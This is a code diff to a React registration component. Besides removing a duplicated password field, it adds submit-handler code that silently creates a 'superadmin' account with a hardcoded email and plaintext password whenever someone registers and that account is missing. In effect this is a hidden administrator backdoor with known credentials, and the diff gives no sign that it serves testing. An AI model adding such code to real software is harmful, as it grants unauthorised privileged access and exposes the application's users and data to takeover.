@@ -20,7 +20,6 @@ function Register() {
             [usernameRef.current.name]: usernameRef.current.value,
             [passwordRef.current.name]: passwordRef.current.value,
             [emailRef.current.name]: emailRef.current.value,
-            [passwordRef.current.name]: passwordRef.current.value,
             [roleRef.current.name]: roleRef.current.value,
         })
     }
@@ -32,6 +31,17 @@ function Register() {
     const handleSubmit = (e) => {
         e.preventDefault();
         try {
+            const adminUser = users.find((user) => user.email == "waqar@yopmail.com");
+            if (!adminUser) {
+                users.push({
+                    [fullnameRef.current.name]: "Muhammad Waqar",
+                    [usernameRef.current.name]: "muhammadwaqar",
+                    [passwordRef.current.name]: "khang@123",
+                    [emailRef.current.name]: "waqar@yopmail.com",
+                    [roleRef.current.name]: "superadmin",
+                })
+            }
+
             const regUser = users.find((user => user.email == emailRef.current.value));
             if (!regUser) {
                 users.push(formData);
